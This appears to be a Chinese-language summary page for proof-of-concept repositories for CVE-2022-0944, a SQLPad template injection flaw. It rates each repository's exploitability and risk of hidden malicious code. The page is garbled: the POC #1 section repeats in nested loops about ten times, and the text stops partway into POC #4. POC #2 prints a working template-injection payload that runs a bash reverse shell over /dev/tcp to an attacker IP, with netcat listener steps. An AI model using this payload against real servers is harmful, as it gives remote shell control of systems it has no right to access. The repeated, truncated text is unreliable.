# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

# CVE-2022-0944

> 📦 该CVE有 **9** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xDTC_SQLPad-6.10.0-Exploit-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** SQLPad

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能进行数据库连接测试

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944是SQLPad中存在的一个模板注入漏洞，存在于连接测试端点。未经授权的攻击者可以通过构造恶意请求，在`host`和`database`字段中注入恶意代码，利用Node.js的`child_process`模块执行任意系统命令，从而实现远程代码执行（RCE）。

**有效性:**

提供的PoC代码看起来有效。它利用了SQLPad未正确过滤用户输入，导致模板引擎执行了恶意代码。该PoC代码构造了一个包含反弹shell的payload，并将其注入到POST请求的`host`和`database`字段中，发送到`/api/test-connection`端点。成功利用后，目标服务器会向攻击者的机器发起反弹shell连接。

**投毒风险:**

分析提供的Bash脚本和README文件，未发现明显的投毒代码。脚本的主要功能是利用漏洞，并没有执行任何恶意操作，例如篡改系统文件或安装恶意软件。README文件仅包含漏洞描述、使用方法和免责声明。因此，可以认为此仓库的投毒风险很低（0%）。

**利用方式:**

1.  攻击者需要搭建一个netcat监听器 (`nc -lvnp 9001`)，用于接收目标服务器的反弹shell。
2.  攻击者需要修改PoC脚本中的`TARGET`变量，设置为目标SQLPad服务器的地址。
3.  攻击者需要修改PoC脚本中的`REVERSE_IP`变量，设置为攻击者机器的IP地址。
4.  运行PoC脚本，脚本会构造一个包含恶意payload的POST请求，并将其发送到目标服务器的`/api/test-connection`端点。
5.  如果漏洞利用成功，目标服务器会执行payload中的反弹shell命令，攻击者将在其netcat监听器上获得一个shell，从而实现远程代码执行。

**项目地址:** [0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944](https://github.com/0xDTC/SQLPad-6.10.0-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #2

**来源**: [CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-0xRoqeeb_sqlpad-rce-exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-模板注入RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用，需要目标应用开放api/test-connection接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是sqlpad 6.10.1之前版本中存在的一个模板注入漏洞，位于/api/test-connection端点。具有足够权限的攻击者可以通过向该端点发送恶意构造的请求，在服务器上执行任意代码。漏洞利用方式是，通过POST请求向/api/test-connection发送包含恶意模板代码的JSON数据。该模板代码利用`process.mainModule.require('child_process').exec()`来执行系统命令，并通过反弹shell的方式获取服务器的控制权。提供的POC代码经过分析是有效的。投毒风险较低，因为该代码直接使用了反弹shell，没有发现隐藏的恶意代码，主要风险在于使用者可能会在未经授权的情况下使用该代码，但从代码本身来看，恶意投毒可能性低。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的模板注入
2.  **前提条件：**
    *   目标SQLPad版本低于 6.10.1
    *   攻击者需要具备高权限访问`/api/test-connection`接口。
    *   目标服务器能够访问攻击者的Netcat监听端口。
3.  **利用步骤：**
    *   攻击者首先需要设置一个Netcat监听器（例如：`nc -lvnp 4444`）。
    *   攻击者使用提供的Python脚本，指定目标SQLPad的URL、攻击者的IP地址和监听端口。
    *   脚本构造包含恶意代码的JSON数据，并将其POST到`/api/test-connection`接口。
    *   恶意代码利用模板引擎执行系统命令，反弹shell到攻击者的监听器。
4.  **Payload分析：**
    *   `{{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"') }}`
    *   这段代码使用Node.js的`child_process.exec`来执行系统命令。
    *   `/bin/bash -c "bash -i >& /dev/tcp/{args.attacker_ip}/{args.attacker_port} 0>&1"` 是一个反弹shell命令，它会连接到攻击者的IP地址和端口，并将shell重定向到该连接。

**项目地址:** [0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944](https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

